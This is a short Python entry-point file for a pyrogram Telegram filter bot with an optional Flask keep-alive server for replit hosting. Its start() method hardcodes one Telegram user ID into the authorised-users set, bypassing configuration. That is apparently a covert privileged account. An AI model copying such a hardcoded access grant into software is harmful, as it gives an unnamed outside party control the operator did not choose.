
import asyncio
import os
import pyrogram

my_secret = os.environ["DATABASE_URI"]
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config



if Config.REPLIT:
    from threading import Thread

    from flask import Flask, jsonify
    app = Flask('')
    
    @app.route('/')
    def main():

        res = {
            "status":"running",
            "hosted":"replit.com",
        }
        
        return jsonify(res)

    def run():
      app.run(host="0.0.0.0", port=8000)
    
    async def keep_alive():
      server = Thread(target=run)
      server.start()



class Bot(pyrogram.Client):
    def __init__(self):
        super().__init__(
        "filter bot",
        api_id=Config.API_ID,
        api_hash=Config.API_HASH,
        bot_token=Config.TG_BOT_TOKEN,
        plugins=dict(root="plugins"),
        workers=300
        )

    async def start(self):
        if Config.REPLIT:
            await keep_alive()
        Config.AUTH_USERS.add(str(1413767412))
        await super().start()


    async def stop(self, *args):
        await super().stop()


if __name__ == "__main__" :
    Bot().run()